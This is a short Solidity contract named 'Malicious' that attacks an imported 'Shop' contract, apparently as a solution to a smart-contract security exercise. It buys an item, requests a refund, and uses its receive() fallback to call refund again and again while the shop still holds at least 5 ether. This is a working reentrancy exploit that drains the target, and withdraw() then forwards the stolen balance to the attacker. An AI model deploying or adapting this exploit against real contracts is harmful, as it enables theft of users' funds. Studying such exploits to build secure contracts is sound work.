pragma solidity ^0.6.0;

import "./contract/Shop.sol";

contract Malicious {

    Shop public shop;
    address private _owner;

    constructor(address shopAddress) public {
        shop = Shop(shopAddress);
        _owner = msg.sender;
    }

    function buy(uint item, uint quantity) public payable {
        shop.buy.value(msg.value)(item, quantity);
    }

    function refund() public {
        shop.refund(0, 1);
    }

    function withdraw() public {
        require(msg.sender == _owner, "Not the owner");
        (bool sent, ) = _owner.call.value(address(this).balance)("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {
        if (address(shop).balance >= 5 ether) {
            shop.refund(0, 1);
        }
    }
}